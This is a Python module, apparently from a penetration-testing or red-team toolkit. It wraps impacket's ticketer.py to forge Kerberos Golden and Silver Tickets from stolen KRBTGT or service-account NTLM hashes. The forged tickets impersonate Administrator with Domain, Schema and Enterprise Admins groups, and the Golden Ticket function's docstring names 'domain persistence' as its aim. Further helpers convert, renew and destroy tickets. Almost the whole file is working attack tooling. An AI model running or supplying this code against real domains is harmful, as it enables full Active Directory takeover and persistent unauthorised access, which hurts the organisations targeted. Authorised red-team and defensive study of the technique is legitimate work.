"""Kerberos ticket generation and manipulation."""

import re
import os
import subprocess
from typing import List, Dict, Optional, Any
from pathlib import Path
from datetime import datetime, timedelta


class TicketGenerator:
    """Kerberos ticket generation and manipulation."""

    def __init__(self):
        """Initialize ticket generator."""
        pass

    def _validate_sid(self, sid: str) -> bool:
        """Validate Windows SID format.

        Args:
            sid: SID to validate

        Returns:
            True if valid SID format
        """
        # SID format: S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx[-RID]
        pattern = r'^S-1-5-21-\d{8,10}-\d{8,10}-\d{8,10}(-\d+)?$'
        return re.match(pattern, sid) is not None

    def generate_golden_ticket(
        self,
        domain: str,
        sid: str,
        krbtgt_hash: str,
        username: str = "Administrator",
        user_id: int = 500,
        groups: Optional[List[int]] = None,
        output_path: Optional[str] = None
    ) -> Optional[str]:
        """Generate Golden Ticket for domain persistence.

        Args:
            domain: Target domain (e.g., corp.local)
            sid: Domain SID (S-1-5-21-...)
            krbtgt_hash: KRBTGT account NTLM hash
            username: Username to impersonate
            user_id: User RID (default 500 for Administrator)
            groups: Group RIDs to add (default: Domain Admins, etc.)
            output_path: Optional output directory

        Returns:
            Path to generated ticket file or None on error
        """
        if not self._validate_sid(sid):
            print("❌ Invalid SID format")
            return None

        try:
            # Default privileged groups
            if groups is None:
                groups = [
                    512,  # Domain Admins
                    513,  # Domain Users
                    518,  # Schema Admins
                    519,  # Enterprise Admins
                    520   # Group Policy Creator Owners
                ]

            # Build ticketer command
            output_dir = output_path or "/tmp"
            ticket_file = f"{output_dir}/{username}_golden.ccache"

            cmd = [
                "ticketer.py",
                "-nthash", krbtgt_hash,
                "-domain-sid", sid,
                "-domain", domain,
                "-user-id", str(user_id),
                "-groups", ','.join(map(str, groups)),
                username
            ]

            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=output_dir
            )

            if result.returncode != 0:
                print(f"❌ Golden ticket generation failed: {result.stderr}")
                return None

            # Ticket saved as username.ccache
            generated_ticket = f"{output_dir}/{username}.ccache"
            if os.path.exists(generated_ticket):
                return generated_ticket

            return None

        except FileNotFoundError:
            print("❌ ticketer.py not found (install impacket)")
            return None
        except Exception as e:
            print(f"❌ Golden ticket error: {e}")
            return None

    def generate_silver_ticket(
        self,
        domain: str,
        sid: str,
        service_hash: str,
        service: str,
        username: str,
        user_id: int = 500,
        groups: Optional[List[int]] = None,
        output_path: Optional[str] = None
    ) -> Optional[str]:
        """Generate Silver Ticket for service access.

        Args:
            domain: Target domain
            sid: Domain SID
            service_hash: Service account NTLM hash
            service: Service SPN (e.g., CIFS/dc01.corp.local)
            username: Username to impersonate
            user_id: User RID
            groups: Group RIDs
            output_path: Optional output directory

        Returns:
            Path to generated ticket file or None on error
        """
        if not self._validate_sid(sid):
            print("❌ Invalid SID format")
            return None

        try:
            # Default groups
            if groups is None:
                groups = [512, 513]  # Domain Admins, Domain Users

            # Build ticketer command
            output_dir = output_path or "/tmp"

            cmd = [
                "ticketer.py",
                "-nthash", service_hash,
                "-domain-sid", sid,
                "-domain", domain,
                "-spn", service,
                "-user-id", str(user_id),
                "-groups", ','.join(map(str, groups)),
                username
            ]

            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=output_dir
            )

            if result.returncode != 0:
                print(f"❌ Silver ticket generation failed: {result.stderr}")
                return None

            # Ticket saved as username.ccache
            generated_ticket = f"{output_dir}/{username}.ccache"
            if os.path.exists(generated_ticket):
                return generated_ticket

            return None

        except FileNotFoundError:
            print("❌ ticketer.py not found (install impacket)")
            return None
        except Exception as e:
            print(f"❌ Silver ticket error: {e}")
            return None

    def parse_ticket_info(self, ticket_path: str) -> Optional[Dict[str, Any]]:
        """Parse Kerberos ticket information.

        Args:
            ticket_path: Path to ticket file

        Returns:
            Dictionary with ticket details
        """
        try:
            # Use klist to view ticket
            env = os.environ.copy()
            env['KRB5CCNAME'] = ticket_path

            cmd = ["klist", "-c", ticket_path]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10,
                env=env
            )

            if result.returncode != 0:
                return None

            # Parse output
            info = {
                "ticket_cache": ticket_path,
                "principals": [],
                "tickets": []
            }

            for line in result.stdout.split('\n'):
                if "Default principal:" in line:
                    info["principal"] = line.split(":")[-1].strip()
                elif "Valid starting" in line or "Expires" in line:
                    # Parse ticket validity info
                    pass

            return info

        except FileNotFoundError:
            print("❌ klist command not found")
            return None
        except Exception as e:
            print(f"❌ Ticket parsing error: {e}")
            return None

    def validate_ticket(self, ticket_path: str) -> bool:
        """Validate ticket structure and expiration.

        Args:
            ticket_path: Path to ticket file

        Returns:
            True if ticket is valid
        """
        if not os.path.exists(ticket_path):
            return False

        try:
            info = self.parse_ticket_info(ticket_path)
            return info is not None

        except Exception:
            return False

    def export_to_kirbi(
        self,
        ccache_path: str,
        output_path: str
    ) -> Optional[str]:
        """Export ccache ticket to .kirbi format.

        Args:
            ccache_path: Input .ccache file
            output_path: Output .kirbi file

        Returns:
            Path to output file or None on error
        """
        try:
            cmd = [
                "ticketConverter.py",
                ccache_path,
                output_path
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0 and os.path.exists(output_path):
                return output_path

            return None

        except FileNotFoundError:
            print("❌ ticketConverter.py not found")
            return None
        except Exception as e:
            print(f"❌ Ticket conversion error: {e}")
            return None

    def import_from_kirbi(
        self,
        kirbi_path: str,
        output_path: str
    ) -> Optional[str]:
        """Import .kirbi ticket to ccache format.

        Args:
            kirbi_path: Input .kirbi file
            output_path: Output .ccache file

        Returns:
            Path to output file or None on error
        """
        try:
            cmd = [
                "ticketConverter.py",
                kirbi_path,
                output_path
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0 and os.path.exists(output_path):
                return output_path

            return None

        except FileNotFoundError:
            print("❌ ticketConverter.py not found")
            return None
        except Exception as e:
            print(f"❌ Ticket conversion error: {e}")
            return None

    def renew_ticket(self, ticket_path: str) -> Optional[str]:
        """Attempt to renew a Kerberos ticket.

        Args:
            ticket_path: Path to ticket to renew

        Returns:
            Path to renewed ticket or None
        """
        try:
            env = os.environ.copy()
            env['KRB5CCNAME'] = ticket_path

            cmd = ["kinit", "-R"]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                env=env
            )

            if result.returncode == 0:
                return ticket_path

            return None

        except Exception as e:
            print(f"❌ Ticket renewal error: {e}")
            return None

    def destroy_ticket(self, ticket_path: str) -> bool:
        """Destroy/delete a Kerberos ticket.

        Args:
            ticket_path: Path to ticket to destroy

        Returns:
            True if successful
        """
        try:
            if os.path.exists(ticket_path):
                os.remove(ticket_path)
                return True

            return False

        except Exception as e:
            print(f"❌ Ticket destruction error: {e}")
            return False
